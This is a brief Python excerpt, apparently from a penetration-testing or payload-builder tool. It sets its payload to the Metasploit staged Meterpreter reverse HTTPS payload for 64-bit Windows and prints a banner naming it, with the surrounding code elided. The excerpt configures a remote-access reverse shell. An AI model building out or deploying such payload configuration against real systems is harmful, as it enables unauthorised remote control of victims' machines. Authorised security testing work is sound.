...
def Construction():
    ...
    RC_PAYLOAD = "windows/x64/meterpreter/reverse_https"

    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "[STAGED] Payload x64 Meterpreter Reverse HTTPS" + core.amcolors.ENDC)
